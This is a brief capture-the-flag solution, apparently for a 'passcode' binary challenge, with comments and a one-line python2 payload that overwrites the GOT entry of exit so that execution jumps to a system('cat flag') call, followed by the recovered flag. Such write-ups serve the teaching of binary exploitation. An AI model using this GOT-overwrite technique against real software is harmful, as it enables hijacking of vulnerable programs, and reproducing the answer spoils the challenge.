#got
#  modify the GOT table of exit with a pointer to the instruction just before the call to system('cat flag')

# Place the address of the GOT entry as last word into the buffer, since we gonna fscan of that address than due to the bug in the source code and then we inject the address (134514147) of the machine code just before call system.

echo `python2 -c "print 'A' * 96 + '\x18\xa0\x04\x08'  + '\n' + '134514147' + '\n' + 'yy' + '\n'"` | ./passcode

#flag:Sorry mom.. I got confused about scanf usage :(
